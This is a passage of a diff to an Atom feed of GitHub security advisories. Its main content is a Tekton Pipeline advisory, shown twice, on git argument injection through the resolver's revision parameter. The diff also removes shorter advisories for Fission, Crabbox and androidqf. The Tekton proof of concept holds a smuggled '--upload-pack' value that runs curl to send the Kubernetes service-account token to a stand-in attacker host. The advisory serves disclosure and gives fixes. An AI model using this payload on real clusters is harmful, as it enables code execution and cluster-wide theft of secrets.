+spec:
+  params:
+    - name: url
+      value: /tmp/localrepo
+    - name: revision
+      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
+    - name: pathInRepo
+      value: README.md
+EOF
+
+# The resolver pod executes:
+# git -C &lt;tmpdir&gt; fetch origin \
+#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
+#   --depth=1
+#
+# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
+# git -C &lt;tmpdir&gt; fetch origin "--upload-pack=/bin/sh" --depth=1
+# Executes /bin/sh with the local repository path as argv[1].
+# From /bin/sh, the attacker can use a pre-staged script (e.g., written
+# via a workspace volume) to achieve arbitrary command execution.
+</code></pre>
+<p><strong>Verified</strong>: <code>git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1</code> executes <code>test-exec.sh</code> on the local machine even when <code>origin</code> is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Code execution on the resolver pod</strong> when an attacker can stage or predict a valid git repository path in <code>/tmp</code> on the resolver pod.</li>
+<li><strong>Full cluster-wide Secret exfiltration</strong>: The <code>tekton-pipelines-resolvers</code> ServiceAccount is bound to a ClusterRole that grants <code>get/list/watch</code> on all Secrets in all namespaces (<code>config/resolvers/200-clusterrole.yaml</code>). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.</li>
+<li><strong>Privilege escalation</strong>: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.</li>
+<li>Both the deprecated resolver (<code>pkg/resolution/resolver/git/</code>) and the current resolver (<code>pkg/remoteresolution/resolver/git/</code>) share the same <code>validateRepoURL</code>, <code>PopulateDefaultParams</code>, and <code>checkout</code> implementation via the shared <code>git</code> package. Both are affected.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Fix 1 — Validate that <code>revision</code> does not begin with <code>-</code></strong> in <code>PopulateDefaultParams</code>:</p>
+<pre><code class="language-go">if strings.HasPrefix(paramsMap[RevisionParam], "-") {
+    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
+}
+</code></pre>
+<p><strong>Fix 2 — Restrict <code>validateRepoURL</code> to remote URLs only</strong> (remove local-path support in production builds, or add an explicit admin opt-in feature flag):</p>
+<pre><code class="language-go">func validateRepoURL(url string) bool {
+    pattern := `^([^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which <code>--upload-pack</code> runs locally) and reduces attack surface further.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40938">https://nvd.nist.gov/vuln/detail/CVE-2026-40938</a></li>
+<li><a href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-21T20:28:36.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
+        <id>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</id>
+        <link href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq"/>
+        <updated>2026-05-21T22:41:28.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>The git resolver's <code>revision</code> parameter is passed directly as a positional argument to <code>git fetch</code> without any validation that it does not begin with a <code>-</code> character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary <code>git fetch</code> flags such as <code>--upload-pack=&lt;binary&gt;</code>. Combined with the <code>validateRepoURL</code> function explicitly permitting URLs that begin with <code>/</code> (local filesystem paths), a tenant who can submit <code>ResolutionRequest</code> objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The <code>tekton-pipelines-resolvers</code> ServiceAccount holds cluster-wide <code>get/list/watch</code> on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.</p>
+<h2 id="details">Details</h2>
+<h3 id="root-cause-1--unvalidated-revision-parameter-passed-to-git-fetch">Root Cause 1 — Unvalidated <code>revision</code> parameter passed to <code>git fetch</code></h3>
+<p><code>pkg/resolution/resolver/git/repository.go:85</code>:</p>
+<pre><code class="language-go">// pkg/resolution/resolver/git/repository.go lines 84-96
+// 'revision' is the raw user-supplied string from the ResolutionRequest param.
+// It is passed verbatim as a positional argument to git fetch:
+func (repo *repository) checkout(ctx context.Context, revision string) error {
+    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
+    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
+    // --upload-pack flag, not as a refspec — executing the binary locally.
+    if err != nil {
+        return fmt.Errorf("fetch: %w", err)
+    }
+    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
+    return err
+}
+</code></pre>
+<p><code>execGit</code> invokes <code>exec.CommandContext("git", ...)</code> — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When <code>revision = "--upload-pack=/path/to/binary"</code>, git receives this as the flag <code>--upload-pack=/path/to/binary</code>, not as a refspec. <code>PopulateDefaultParams</code> (<code>resolver.go:418–424</code>) applies only a leading-slash strip and a <code>containsDotDot</code> check on the <code>pathInRepo</code> parameter; the <code>revision</code> parameter receives no validation at all.</p>
+<h3 id="root-cause-2--validaterepourl-explicitly-permits-local-filesystem-paths">Root Cause 2 — <code>validateRepoURL</code> explicitly permits local filesystem paths</h3>
+<p><code>pkg/resolution/resolver/git/resolver.go:154-158</code>:</p>
+<pre><code class="language-go">// validateRepoURL validates if the given URL is a valid git, http, https URL or
+// starting with a / (a local repository).
+func validateRepoURL(url string) bool {
+    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Any URL beginning with <code>/</code> passes validation and is used directly as the argument to <code>git clone</code>. This means a local filesystem path such as <code>/tmp/some-repo</code> is a valid resolver URL.</p>
+<h3 id="exploit-chain">Exploit Chain</h3>
+<p><code>--upload-pack=&lt;binary&gt;</code> causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (<code>/path</code>), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via <code>exec.Command</code> as a single <code>--upload-pack=&lt;binary&gt;</code> string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., <code>/bin/sh</code>, <code>/usr/bin/curl</code>, <code>/bin/cp</code>).</p>
+<p>Attack complexity is High because the exploit requires either:</p>
+<ul>
+<li>A valid git repository at a known, predicable path on the resolver pod (e.g., <code>/tmp/&lt;reponame&gt;-&lt;suffix&gt;</code> from a concurrent resolution), or</li>
+<li>A default-URL configuration pointing at a local path</li>
+</ul>
+<h2 id="poc">PoC</h2>
+<pre><code class="language-bash"># Step 1: Set up a local git repository to serve as the "origin"
+# (in a real attack, the attacker would time this against a concurrent clone
+# or use any pre-existing git repo path on the resolver pod)
+git init /tmp/localrepo &amp;&amp; cd /tmp/localrepo &amp;&amp; git commit --allow-empty -m "init"
+
+# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
+kubectl create -f - &lt;&lt;'EOF'
+apiVersion: resolution.tekton.dev/v1beta1
+kind: ResolutionRequest
+metadata:
+  name: revision-injection-poc
+  namespace: default
+  labels:
+    resolution.tekton.dev/type: git
+spec:
+  params:
+    - name: url
+      value: /tmp/localrepo
+    - name: revision
+      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
+    - name: pathInRepo
+      value: README.md
+EOF
+
+# The resolver pod executes:
+# git -C &lt;tmpdir&gt; fetch origin \
+#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
+#   --depth=1
+#
+# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
+# git -C &lt;tmpdir&gt; fetch origin "--upload-pack=/bin/sh" --depth=1
+# Executes /bin/sh with the local repository path as argv[1].
+# From /bin/sh, the attacker can use a pre-staged script (e.g., written
+# via a workspace volume) to achieve arbitrary command execution.
+</code></pre>
+<p><strong>Verified</strong>: <code>git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1</code> executes <code>test-exec.sh</code> on the local machine even when <code>origin</code> is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.</p>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Code execution on the resolver pod</strong> when an attacker can stage or predict a valid git repository path in <code>/tmp</code> on the resolver pod.</li>
+<li><strong>Full cluster-wide Secret exfiltration</strong>: The <code>tekton-pipelines-resolvers</code> ServiceAccount is bound to a ClusterRole that grants <code>get/list/watch</code> on all Secrets in all namespaces (<code>config/resolvers/200-clusterrole.yaml</code>). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.</li>
+<li><strong>Privilege escalation</strong>: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.</li>
+<li>Both the deprecated resolver (<code>pkg/resolution/resolver/git/</code>) and the current resolver (<code>pkg/remoteresolution/resolver/git/</code>) share the same <code>validateRepoURL</code>, <code>PopulateDefaultParams</code>, and <code>checkout</code> implementation via the shared <code>git</code> package. Both are affected.</li>
+</ul>
+<h2 id="recommended-fix">Recommended Fix</h2>
+<p><strong>Fix 1 — Validate that <code>revision</code> does not begin with <code>-</code></strong> in <code>PopulateDefaultParams</code>:</p>
+<pre><code class="language-go">if strings.HasPrefix(paramsMap[RevisionParam], "-") {
+    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
+}
+</code></pre>
+<p><strong>Fix 2 — Restrict <code>validateRepoURL</code> to remote URLs only</strong> (remove local-path support in production builds, or add an explicit admin opt-in feature flag):</p>
+<pre><code class="language-go">func validateRepoURL(url string) bool {
+    pattern := `^([^@]+@[^:]+|(git|https?)://)`
+    re := regexp.MustCompile(pattern)
+    return re.MatchString(url)
+}
+</code></pre>
+<p>Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which <code>--upload-pack</code> runs locally) and reduces attack surface further.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
+<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40938">https://nvd.nist.gov/vuln/detail/CVE-2026-40938</a></li>
+<li><a href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/advisories/GHSA-94jr-7pqp-xhcq</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-04-21T20:28:36.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/boxlite-ai/boxlite/sdks/go] Boxlite: Path Traversal Vulnerability Leads to Arbitrary File Write on the Host]]></title>
         <id>https://github.com/advisories/GHSA-f396-4rp4-7v2j</id>
@@ -1442,164 +2027,5 @@ FINAL RESULT:
         </author>
         <category label="severity" term="CRITICAL"/>
         <published>2026-05-21T20:14:51.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/fission/fission] Fission StorageSvc /v1/archive endpoint exposes unauthenticated CRUD over all function archives]]></title>
-        <id>https://github.com/advisories/GHSA-chf8-4hv6-8pg6</id>
-        <link href="https://github.com/advisories/GHSA-chf8-4hv6-8pg6"/>
-        <updated>2026-05-21T20:07:15.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The Fission <code>storagesvc</code> component registers archive CRUD handlers (<code>/v1/archive</code> GET / POST / DELETE and <code>/v1/archives</code> list) directly on its HTTP router without performing any authentication or authorization. Any caller able to reach the <code>storagesvc</code> ClusterIP — including  any other workload in the same Kubernetes cluster — could enumerate archive IDs, download archives belonging to other tenants, upload arbitrary archive content, and delete archives.</p>
-<h3 id="affected-component">Affected component</h3>
-<ul>
-<li><code>pkg/storagesvc/storagesvc.go</code> — handler registration and per-route handler logic at lines   72-95 (list), 167-199 (download/delete), and 263-270 (route wiring).</li>
-</ul>
-<h3 id="impact">Impact</h3>
-<p>A workload elsewhere in the cluster (e.g. a compromised function pod, a noisy-neighbour tenant in a multi-tenant deployment, or any pod whose egress is not constrained by NetworkPolicy) could:</p>
-<ol>
-<li>Enumerate every function deployment archive in the cluster.</li>
-<li>Download the deployment archive of any function in any namespace, exposing the function's source code and any embedded secrets.</li>
-<li>Delete archives, causing the next function specialization or rebuild to fail.</li>
-<li>Upload arbitrary archives that subsequent function specializations would fetch and execute.</li>
-</ol>
-<p>In multi-tenant Fission deployments this completely breaks the tenant boundary for function code.</p>
-<h3 id="root-cause">Root cause</h3>
-<p><code>pkg/storagesvc/storagesvc.go</code> mounts the handlers without an authentication middleware. Network-layer controls (<code>NetworkPolicy</code>) were the only line of defence before this fix, and the chart shipped no <code>NetworkPolicy</code> for <code>storagesvc</code> by default, so reachability was open.</p>
-<h3 id="fix">Fix</h3>
-<p>  Released in <a href="https://github.com/fission/fission/releases/tag/v1.23.0">v1.23.0</a>:</p>
-<ul>
-<li><strong>PR #3368</strong> (commit <code>2455fc0c</code>) wraps the <code>storagesvc</code> archive routes with the application-layer HMAC verifier from <code>pkg/auth/hmac</code> using the <code>ServiceStoragesvc</code> derived key. Callers (executor, fetcher, builder, CLI) sign their requests using a shared cluster master secret derived per-service via HKDF. Mismatched signatures are rejected with <code>401</code>.</li>
-<li>Defence in depth: <strong>PR #3365</strong> added a <code>NetworkPolicy</code> for <code>storagesvc</code> so only the executor/fetcher/builder pods can reach it network-layer (independent of authentication).</li>
-</ul>
-<h3 id="mitigation-until-upgrade">Mitigation (until upgrade)</h3>
-<ol>
-<li>Enable the Helm chart's per-service NetworkPolicy (set <code>networkPolicy.enabled=true</code>).</li>
-<li>Restrict <code>storagesvc</code> egress/ingress to the executor, builder, and fetcher pods only.</li>
-<li>Avoid running untrusted workloads in the cluster that hosts Fission.</li>
-</ol>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fission/fission/security/advisories/GHSA-chf8-4hv6-8pg6">https://github.com/fission/fission/security/advisories/GHSA-chf8-4hv6-8pg6</a></li>
-<li><a href="https://github.com/fission/fission/pull/3365">https://github.com/fission/fission/pull/3365</a></li>
-<li><a href="https://github.com/fission/fission/pull/3368">https://github.com/fission/fission/pull/3368</a></li>
-<li><a href="https://github.com/fission/fission/releases/tag/v1.23.0">https://github.com/fission/fission/releases/tag/v1.23.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-chf8-4hv6-8pg6">https://github.com/advisories/GHSA-chf8-4hv6-8pg6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-chf8-4hv6-8pg6</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-21T20:07:13.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/openclaw/crabbox] Crabbox: environment variable exposure vulnerability]]></title>
-        <id>https://github.com/advisories/GHSA-fm77-94qm-4894</id>
-        <link href="https://github.com/advisories/GHSA-fm77-94qm-4894"/>
-        <updated>2026-05-21T19:29:24.000Z</updated>
-        <content type="html"><![CDATA[<p>Crabbox prior to v0.12.0 contains an environment variable exposure vulnerability that allows attackers with access to a malicious or compromised repository to forward local secrets such as API tokens, cloud credentials, and broker tokens into the remote command environment. Attackers can exploit overly permissive environment variable allowlisting in repo-local Crabbox configuration to serialize sensitive environment variables into remote command execution, exposing credentials to the remote environment.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8634">https://nvd.nist.gov/vuln/detail/CVE-2026-8634</a></li>
-<li><a href="https://github.com/openclaw/crabbox/pull/78">https://github.com/openclaw/crabbox/pull/78</a></li>
-<li><a href="https://github.com/openclaw/crabbox/commit/eaae40ae4ce009e60633f16f7f19600c74557f6f">https://github.com/openclaw/crabbox/commit/eaae40ae4ce009e60633f16f7f19600c74557f6f</a></li>
-<li><a href="https://github.com/openclaw/crabbox/releases/tag/v0.12.0">https://github.com/openclaw/crabbox/releases/tag/v0.12.0</a></li>
-<li><a href="https://www.vulncheck.com/advisories/crabbox-environment-variable-information-disclosure">https://www.vulncheck.com/advisories/crabbox-environment-variable-information-disclosure</a></li>
-<li><a href="https://github.com/advisories/GHSA-fm77-94qm-4894">https://github.com/advisories/GHSA-fm77-94qm-4894</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-fm77-94qm-4894</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-05-14T21:30:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/openclaw/crabbox] Crabbox: authentication bypass vulnerability that allows impersonation of others by spoofing identity headers]]></title>
-        <id>https://github.com/advisories/GHSA-4g9m-rffv-h6wq</id>
-        <link href="https://github.com/advisories/GHSA-4g9m-rffv-h6wq"/>
-        <updated>2026-05-21T19:29:08.000Z</updated>
-        <content type="html"><![CDATA[<p>Crabbox prior to v0.12.0 contains an authentication bypass vulnerability that allows non-admin shared-token callers to impersonate other owners or organizations by spoofing identity headers. Attackers can inject malicious X-Crabbox-Owner and X-Crabbox-Org headers in requests authenticated with a shared token to bypass authorization checks and access owner/org-scoped lease operations belonging to victim accounts.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-8621">https://nvd.nist.gov/vuln/detail/CVE-2026-8621</a></li>
-<li><a href="https://github.com/openclaw/crabbox/pull/70">https://github.com/openclaw/crabbox/pull/70</a></li>
-<li><a href="https://github.com/openclaw/crabbox/commit/b657323f1d1c954cefc8444571fa6c45a8896e7f">https://github.com/openclaw/crabbox/commit/b657323f1d1c954cefc8444571fa6c45a8896e7f</a></li>
-<li><a href="https://github.com/openclaw/crabbox/releases/tag/v0.12.0">https://github.com/openclaw/crabbox/releases/tag/v0.12.0</a></li>
-<li><a href="https://www.vulncheck.com/advisories/crabbox-authentication-bypass-via-header-spoofing">https://www.vulncheck.com/advisories/crabbox-authentication-bypass-via-header-spoofing</a></li>
-<li><a href="https://github.com/advisories/GHSA-4g9m-rffv-h6wq">https://github.com/advisories/GHSA-4g9m-rffv-h6wq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-4g9m-rffv-h6wq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-05-14T21:30:43.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mvt-project/androidqf] androidqf: APK download Path Traversal in device APK paths]]></title>
-        <id>https://github.com/advisories/GHSA-763j-3p5v-jfc6</id>
-        <link href="https://github.com/advisories/GHSA-763j-3p5v-jfc6"/>
-        <updated>2026-05-21T17:12:06.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>During device acquisition, <code>getPathToLocalCopy()</code> constructs local filesystem paths for downloaded APKs using a filename component extracted by <code>extractFileName()</code>. The extraction splits on <code>==/</code> and takes the remainder without sanitization. If a compromised device returns a crafted APK path containing traversal sequences, <code>filepath.Join</code> resolves them, allowing the file to be written outside the intended <code>apks/</code> directory.</p>
-<p>Practical exploitability is limited because Android enforces strict package path formats under <code>/data/app/</code> and does not allow apps to register paths containing traversal sequences. Rated Informational as a defense-in-depth concern.</p>
-<h3 id="impact">Impact</h3>
-<p>An attacker with control of the connected device could potentially write files outside the expected output directory on the acquisition workstation, leading to arbitrary file overwrite with attacker-controlled content.</p>
-<h3 id="patched-version">Patched version</h3>
-<p><a href="https://github.com/mvt-project/androidqf/releases/tag/v1.8.3">1.8.3</a></p>
-<h3 id="credits">Credits</h3>
-<ul>
-<li>This issue was identified during a security assessment conducted by 0xche. </li>
-<li>An additional vulnerability was independently identified by @0x0v1</li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mvt-project/androidqf/security/advisories/GHSA-763j-3p5v-jfc6">https://github.com/mvt-project/androidqf/security/advisories/GHSA-763j-3p5v-jfc6</a></li>
-<li><a href="https://github.com/mvt-project/androidqf/releases/tag/v1.8.3">https://github.com/mvt-project/androidqf/releases/tag/v1.8.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-763j-3p5v-jfc6">https://github.com/advisories/GHSA-763j-3p5v-jfc6</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-763j-3p5v-jfc6</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-21T17:11:47.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/mvt-project/androidqf] androidqf: Zip entry Name Injection in APK bundle (Zip Slip for zip consumers)]]></title>
-        <id>https://github.com/advisories/GHSA-jf2q-463c-6f52</id>
-        <link href="https://github.com/advisories/GHSA-jf2q-463c-6f52"/>
-        <updated>2026-05-21T17:09:02.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>generateZipPath()</code> constructs zip entry names for collected APKs using device controlled content from <code>extractFileName()</code>. Since <code>extractFileName()</code> does not reject traversal sequences, the resulting zip entry name can contain <code>../</code>. AndroidQF itself does not extract the zip it creates, but any forensic tool that extracts the acquisition bundle without zip-slip protection could write files to attacker chosen paths.</p>
-<h3 id="impact">Impact</h3>
-<p>A compromised device could inject path traversal sequences into the acquisition bundle's zip entry names. When a forensic analyst or forensic tooling extracts the bundle without entry name validation, files could be written outside the intended extraction directory.</p>
-<h3 id="patched-version">Patched version</h3>
-<p><a href="https://github.com/mvt-project/androidqf/releases/tag/v1.8.3">1.8.3</a></p>
-<h3 id="credits">Credits</h3>
-<p>This issue was identified during a security assessment conducted by 0xche.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/mvt-project/androidqf/security/advisories/GHSA-jf2q-463c-6f52">https://github.com/mvt-project/androidqf/security/advisories/GHSA-jf2q-463c-6f52</a></li>
-<li><a href="https://github.com/mvt-project/androidqf/releases/tag/v1.8.3">https://github.com/mvt-project/androidqf/releases/tag/v1.8.3</a></li>
-<li><a href="https://github.com/advisories/GHSA-jf2q-463c-6f52">https://github.com/advisories/GHSA-jf2q-463c-6f52</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-jf2q-463c-6f52</uri>
-        </author>
-        <category label="severity" term="LOW"/>
-        <published>2026-05-21T17:09:00.000Z</published>
     </entry>
 </feed>
